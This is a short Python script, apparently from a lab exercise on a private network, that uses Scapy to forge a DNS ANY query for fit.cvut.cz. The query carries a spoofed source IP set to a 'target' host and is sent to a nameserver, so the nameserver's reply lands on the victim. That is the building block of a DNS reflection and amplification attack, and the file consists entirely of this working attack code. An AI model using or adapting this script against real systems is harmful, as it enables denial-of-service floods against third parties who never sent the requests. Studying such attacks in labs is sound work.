from scapy.all import *
 
target     = "192.168.56.10" # Target host
nameserver = "192.168.56.12" # DNS server
 
ip  = IP(src=target, dst=nameserver)
udp = UDP(dport=53)
dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname="fit.cvut.cz", qtype=255))
 
request = (ip/udp/dns)
 
send(request)
